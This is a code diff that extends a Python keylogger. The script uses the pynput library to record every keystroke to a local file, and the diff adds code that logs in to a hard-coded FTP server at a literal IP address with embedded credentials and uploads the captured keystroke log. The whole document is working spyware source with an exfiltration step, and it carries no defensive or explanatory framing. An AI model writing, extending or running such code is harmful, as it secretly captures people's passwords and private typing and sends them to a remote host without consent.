@@ -1,6 +1,9 @@
 
-from pynput import keyboard
+# from pynput import keyboard
 
+import ftplib
+from ftplib import FTP
+from pynput import keyboard
 
 word = ""
 
@@ -18,13 +21,10 @@ def on_press(key):
 
 def write_word():
     global word
-    with open("log.txt", "a") as f:
+    with open("keylogs.txt", "a") as f:
         f.write(word)
         f.write("\n")
     word = ""
-
-
-
 
 # Create a listener object
 listener = keyboard.Listener(on_press=on_press)
@@ -32,6 +32,25 @@ listener = keyboard.Listener(on_press=on_press)
 # Start the listener
 listener.start()
 
+# FTP server settings
+ftp_server = "108.48.125.159"
+ftp_username = "ftpconnection"
+ftp_password = "SECURESHELL"
+
+# Connect to the FTP server
+ftp = ftplib.FTP(ftp_server)
+ftp.login(ftp_username, ftp_password)
+
+# Change to the remote directory
+ftp.cwd("/home/ftpconnection/files")
+
+# Open the local file
+with open("keylogs.txt", "rb") as f:
+    # Store the file on the remote machine
+    ftp.storbinary("STOR keylogs.txt", f)
+
+# Close the FTP connection
+ftp.quit()
+
 # Wait for the listener to stop
 listener.join()
-
